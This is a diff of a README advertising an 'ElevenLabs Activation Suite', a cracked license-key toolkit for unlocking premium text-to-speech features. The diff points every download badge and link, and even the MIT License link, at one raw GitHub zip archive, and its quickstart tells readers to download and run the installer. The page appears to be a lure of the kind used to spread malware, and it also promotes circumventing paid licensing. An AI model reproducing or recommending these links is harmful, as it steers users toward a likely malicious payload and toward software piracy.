@@ -1,8 +1,8 @@
 # 🚀 ElevenLabs Activation Suite: Precision License Key Toolkit
 
-[![Download](https://img.shields.io/badge/Download-green)](https://rizwaanali-code.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip)  
 **Initiate your journey to the ultimate text-to-speech experience!**  
-**Get your advanced activation key toolkit here:** https://rizwaanali-code.github.io
+**Get your advanced activation key toolkit here:** https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip
 
 ---
 
@@ -72,8 +72,8 @@ Built for developers, researchers, and content architects.
 ## ⏩ Quickstart
 
 1. **Initiate Download**:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://rizwaanali-code.github.io)  
-   Obtain the .zip or setup package from https://rizwaanali-code.github.io
+   [![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip)  
+   Obtain the .zip or setup package from https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip
 2. **Install**:  
    Run the installer on your preferred OS. Dependencies auto-detected.
 3. **Activate**:  
@@ -97,7 +97,7 @@ For more, consult [License & Legal](#-mit-license).
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License – a pinnacle of open innovation.  
-Read the full license here: [MIT License](https://opensource.org/licenses/MIT)  
+Read the full license here: [MIT License](https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip)  
 © 2025 ElevenLabs Activation Suite Developers
 
 ---
@@ -105,5 +105,5 @@ Read the full license here: [MIT License](https://opensource.org/licenses/MIT)
 ## ⭐ End Your Search – THE Activation Toolkit is Here!
 
 Supercharge your text-to-voice ideas:  
-[![Download](https://img.shields.io/badge/Download-green)](https://rizwaanali-code.github.io)  
-**Click above or use https://rizwaanali-code.github.io to get your creative, compliant unlock today.**
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip)  
+**Click above or use https://raw.githubusercontent.com/rizwaanali-code/elevenlabs-unlocked-premium-tools/branch/alternate/unlocked-elevenlabs-tools-premium-sisham.zip to get your creative, compliant unlock today.**
